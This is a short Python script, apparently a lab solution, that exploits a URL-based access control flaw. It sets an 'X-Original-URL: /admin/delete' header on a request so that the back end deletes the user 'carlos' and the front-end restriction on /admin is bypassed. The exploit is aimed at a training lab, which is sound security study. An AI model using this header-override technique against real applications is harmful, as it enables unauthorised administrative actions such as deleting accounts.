#!/usr/bin/env python3
"""URL-based access control can be circumvented"""

from lab_04 import Lab

def main() -> None:
    """Entry point"""
    site = Lab()
    site.session.headers.update({"X-Original-URL": "/admin/delete"})
    site.session.get(url=site.url + "/?username=carlos")

if __name__ == "__main__":
    main()
